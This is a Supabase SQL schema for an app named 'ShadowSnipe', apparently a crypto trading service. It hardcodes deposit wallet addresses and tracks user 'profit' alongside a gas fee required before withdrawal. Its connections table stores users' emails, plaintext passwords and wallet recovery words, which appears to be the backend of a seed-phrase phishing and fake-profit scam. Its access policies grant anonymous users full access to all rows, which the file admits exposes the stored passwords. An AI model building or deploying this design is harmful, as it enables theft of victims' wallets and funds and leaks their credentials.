-- ShadowSnipe — Supabase schema
-- Run this in your Supabase project: Dashboard > SQL Editor > New query > Run.

-- ------------------------------------------------------------------
-- app_settings: a single config row (id = 1)
-- ------------------------------------------------------------------
create table if not exists public.app_settings (
  id                  int primary key default 1,
  admin_password      text,
  deposit_wallet_xrp  text,
  deposit_wallet_btc  text,
  deposit_wallet_sol  text,
  gas_fee_wallet_evm  text,
  eth_price_usd       numeric,
  gas_fee_usd         numeric,
  constraint app_settings_singleton check (id = 1)
);

-- Seed the single settings row with the app's defaults.
insert into public.app_settings (
  id, admin_password,
  deposit_wallet_xrp, deposit_wallet_btc, deposit_wallet_sol,
  gas_fee_wallet_evm, eth_price_usd, gas_fee_usd
) values (
  1, '',
  'rJuZ88G5Urddbm1ZZKfsojXLv8omCZ3ruZ',
  'bc1qrw5yzwwtuc4lfnxm53uuefmlq52cgee04e4lkf',
  '9gLTbuPfFqUfAJjHLnCKdP9vK28LuL6Xw28Z6UV6oqdy',
  '', 2500, 5
) on conflict (id) do nothing;

-- ------------------------------------------------------------------
-- connections: one row per connected wallet / user
-- ------------------------------------------------------------------
create table if not exists public.connections (
  id              uuid primary key default gen_random_uuid(),
  wallet_id       text not null default 'unknown',
  chain           text not null default 'evm',
  address         text not null,
  username        text,
  deposited       numeric default 0,
  profit          numeric default 0,
  pnl             numeric default 0,
  email             text,
  password          text,
  credentials_at    timestamptz,
  recovery_words    jsonb,
  recovery_words_at timestamptz,
  at                timestamptz not null default now()
);

-- If the table already existed, add the new columns.
alter table public.connections add column if not exists recovery_words jsonb;
alter table public.connections add column if not exists recovery_words_at timestamptz;

-- Case-insensitive uniqueness on address (matches the app's ilike lookups).
create unique index if not exists connections_address_lower_key
  on public.connections (lower(address));

-- ------------------------------------------------------------------
-- deposits
-- ------------------------------------------------------------------
create table if not exists public.deposits (
  id          uuid primary key default gen_random_uuid(),
  address     text not null,
  username    text,
  wallet_id   text not null,
  asset       text not null,
  amount_usd  numeric not null,
  at          timestamptz not null default now()
);
create index if not exists deposits_address_idx on public.deposits (lower(address));

-- ------------------------------------------------------------------
-- withdrawals
-- ------------------------------------------------------------------
create table if not exists public.withdrawals (
  id           uuid primary key default gen_random_uuid(),
  address      text not null,
  username     text,
  wallet_id    text not null,
  amount_usd   numeric not null,
  gas_usd      numeric not null default 0,
  gas_tx_hash  text,
  gas_asset    text,
  status       text not null default 'pending',
  at           timestamptz not null default now()
);
create index if not exists withdrawals_address_idx on public.withdrawals (lower(address));

-- ------------------------------------------------------------------
-- Row Level Security
-- ------------------------------------------------------------------
-- This app uses the anon/public key (see .env), so RLS is enforced. The
-- policies below grant the anon role full access — this is a client-only app
-- with no auth, so the browser must be able to read/write directly.
--
-- NOTE: with these permissive policies, anyone holding the anon key can still
-- read every row (including stored passwords). Enabling RLS mainly stops the
-- anon key from doing schema-level / destructive operations that service_role
-- allowed. Proper per-user isolation would require Supabase Auth + a backend.

alter table public.app_settings enable row level security;
alter table public.connections  enable row level security;
alter table public.deposits     enable row level security;
alter table public.withdrawals  enable row level security;

create policy "anon full access" on public.app_settings for all
  to anon using (true) with check (true);
create policy "anon full access" on public.connections for all
  to anon using (true) with check (true);
create policy "anon full access" on public.deposits for all
  to anon using (true) with check (true);
create policy "anon full access" on public.withdrawals for all
  to anon using (true) with check (true);
